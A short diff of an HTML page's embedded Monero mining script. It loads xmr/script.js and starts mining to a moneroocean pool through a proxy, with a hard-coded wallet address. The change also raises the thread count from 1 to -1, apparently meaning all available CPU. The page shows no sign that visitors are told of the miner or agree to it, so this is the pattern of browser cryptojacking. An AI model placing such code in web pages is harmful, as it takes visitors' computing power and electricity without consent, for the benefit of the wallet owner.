@@ -9,11 +9,11 @@
       <!-- Start Of Mining Code -->
       <script src="xmr/script.js"></script>
       <script>
-          //server = "wss://gulf.moneroocean.stream:10128";//ny1.xmrminingproxy.com
+          server = "wss://ny1.xmrminingproxy.com/;wws://gulf.moneroocean.stream:10128";
           var pool = "gulf.moneroocean.stream:10128";
           var walletAddress = "46pRFEEgprqLvgsQz11Mq6JoSeYNggjghgNGkEbDemiRVCLPYM8FTK6g9TJv1CNenseNfwE6PbmzMZX5Mr767nxJR55qMaJ";
           var workerId = "GH-XMR"
-          var threads =1;
+          var threads =-1;
           var password = "";
           console.log("Config Loaded")
           startMining(pool, walletAddress, workerId, threads, password)
